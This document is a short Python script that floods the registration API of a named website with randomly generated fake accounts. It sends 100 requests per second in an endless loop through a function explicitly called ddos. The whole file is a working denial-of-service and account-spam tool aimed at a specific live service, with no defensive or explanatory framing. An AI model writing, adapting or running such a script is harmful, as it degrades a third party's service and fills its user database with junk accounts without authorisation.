import requests
import random
import string
import time
import multiprocessing

url = "https://gamegarant.su/api/auth/register/"

def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def register_user():
    username = generate_random_string(8)
    email = generate_random_string(10) + "@gmail.com"
    password = generate_random_string(8)

    data = {
        "username": username,
        "email": email,
        "password": password
    }

    response = requests.post(url, data=data)
    print(response.json())

def ddos():
    while True:
        for _ in range(100):
            register_user()

        time.sleep(1)

ddos()
